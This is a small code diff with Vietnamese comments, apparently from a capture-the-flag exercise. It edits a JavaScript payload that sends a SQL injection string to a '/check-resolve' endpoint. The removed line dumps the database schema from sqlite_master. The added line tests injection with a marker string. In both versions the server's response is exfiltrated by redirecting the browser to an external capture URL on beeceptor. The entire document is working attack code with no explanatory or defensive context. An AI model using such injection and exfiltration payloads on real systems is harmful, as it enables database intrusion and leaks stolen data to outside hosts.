@@ -1,7 +1,7 @@
 let formData = new URLSearchParams();
 
-// Dùng AS resolve để "ngụy trang" dữ liệu của chúng ta thành cột hợp lệ
-formData.append('id', '-1 UNION SELECT GROUP_CONCAT(sql) AS resolve FROM sqlite_master');
+// Nhét thử một chuỗi ký tự bình thường xem Backend có chịu in ra không
+formData.append('id', '-1 UNION SELECT "KHANH_TEST"');
 
 fetch('/check-resolve', {
     method: 'POST',
@@ -15,6 +15,5 @@ fetch('/check-resolve', {
 })
 .then(response => response.text())
 .then(data => {
-    // Bế data trả về thẳng Beeceptor
-    window.location = 'https://khanh.free.beeceptor.com/?flag=' + encodeURIComponent(data);
+    window.location = 'https://khanh.free.beeceptor.com/?result=' + encodeURIComponent(data);
 });
